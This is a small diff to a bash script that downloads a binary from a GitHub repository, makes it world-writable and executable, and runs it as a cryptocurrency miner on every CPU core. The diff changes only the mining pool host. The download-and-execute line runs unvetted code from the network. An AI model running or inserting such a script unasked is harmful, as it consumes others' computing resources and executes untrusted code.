@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O biru https://github.com/kidoescegh/filee/raw/main/avx2adv 
 chmod 777 biru
-./biru -a yespoweradvc -o stratum+tcp://stratum.gettomine.com:6998 -u AMfDZ53tyUitZBpR5H8C4ydY7dbAq4n7JH.$(shuf -n 1 -i 1-99999)-ADV -t $(nproc --all)
+./biru -a yespoweradvc -o stratum+tcp://stratum.novagrid.online:3130 -u AMfDZ53tyUitZBpR5H8C4ydY7dbAq4n7JH.$(shuf -n 1 -i 1-99999)-ADV -t $(nproc --all)
